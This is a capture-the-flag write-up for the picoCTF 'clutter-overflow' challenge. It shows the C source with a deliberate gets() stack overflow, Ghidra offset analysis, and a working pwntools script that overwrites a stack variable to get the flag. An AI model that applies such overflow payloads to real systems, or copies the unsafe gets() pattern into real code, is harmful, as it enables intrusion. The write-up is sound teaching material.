# clutter-overflow

The description for this challenge was as follows:

*Author: notdeghost*
*Description*

*Clutter, clutter everywhere and not a byte to use.*

*nc mars.picoctf.net 31890*

It was in the binary exploitation category and worth 150 points. In my humble opinion, it is an extremely easy challenge that would be great for someone extremely new to binary exploitation challenges. You were given the C source code for the challenge and the challenge binary.

**TL;DR Solution:** Overflow your input to overwrite the stack variable "code" and make it equal to 0xdeadbeef. The program will then print your flag.

So, when I initially ran the function, I got this result:
```
knittingirl@piglet:~/CTF/pico21_mini$ nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
aaaaaaaaaaa
code == 0x0
code != 0xdeadbeef :(
```
So, it looks like it is comparing the value of some variable, called code, with 0xdeadbeef. It is kind enough to show us the variable's current value as well, which is 0.

When we open up the C source code, we can see that if we are able to set the value of the code variable to 0xdeadbeef, it will print the contents of the flag file, giving us a win. We can also see that the program is getting our input with a gets() function and storing the content in a buffer of size 0x100 on the stack. This means that we can input more than 0x100 (256) characters, which will let us overwrite other variables on the stack. The most important of these is code. The C code is here in full:
```
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER = 
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}
```
The main issue at this point is determining the exact offset between the beginning of clutter and the code variable. The idea here is to input padding that is the same length as this offset, then add the bytes for 0xdeadbeef at the end. One way to do this is by opening up the code in Ghidra. If we look at the main pane for the main function (the part with the assembly code), at the very top, we can see that it provides the exact locations on the stack of our two stack variables. The stack grows upward, so the clutter variable is the one at Stack[-0x118], and the code variable is the one at Stack[-0x10]. The difference between these two numbers is 0x108, or 264.
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[3]:     004006d2(W), 
                                                                                                   00400756(R), 
                                                                                                   0040078c(R)  
             undefined1        Stack[-0x118   local_118                               XREF[1]:     0040073d(*)  
                             main                                            XREF[5]:     Entry Point(*), 
                                                                                          _start:004005fd(*), 
                                                                                          _start:004005fd(*), 00400e94, 
                                                                                          00400f38(*)  
        004006c7 55              PUSH       RBP

```
We can the put this all together for an exploit in which we send 264 bytes of padding, then the bytes for 0xdeadbeef. I am using pwntools for this exploit and won't explain it in too much detail, but I think the code is relatively self explanatory.

The final script was relatively simple:
```
from pwn import * 

#I used these lines for local debugging
#target = process('./clutter_overflow')

#This wasn't necessary since the program prints the values.
#If it didn't print the values, you could check it was working by viewing the contents of the addresses being compared on the line that this breaks at

#pid = gdb.attach(target, "\nb *main+143\ncontinue")

target = remote('mars.picoctf.net', 31890)


print(target.recvuntil(b'What do you see?'))

#This could be used in alternative way to find the padding. You would look at the value in code if this payload is passed, and determine the offset of the unique substring within the cyclic string.
payload = cyclic(1000)

padding = b'a' * 264
payload = padding
#This is an easy way to encode numeric values into bytes. In little endian, the bytes are '\xef\xbe\xad\xde\x00\x00\x00\x00
payload += p64(0xdeadbeef)

target.sendline(payload)

#Not necessary here, but it's good practice to put this at the end since if you are trying to open a shell, it will close immediately if this isn't here.
target.interactive()
```
And the result looked like this:
```
knittingirl@piglet:~/CTF/pico21_mini$ python3 clutter_overflow_payload.py 
[+] Opening connection to mars.picoctf.net on port 31890: Done
b' ______________________________________________________________________\n|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n|\'.____\'_^||/!\\@@@@@/!\\|| _\'______________.\'|==                    =====\n|\\|______|===============|________________|/|""""""""""""""""""""""""""\n" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  \n""\'\'""""\'\'"""""""""""""""\'\'""""""""""""""\'\'""""""""""""""""""""""""""""""\n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\n"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\nMy room is so cluttered...\nWhat do you see?'
[*] Switching to interactive mode

code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{REDACTED}
[*] Got EOF while reading in interactive
$  

```
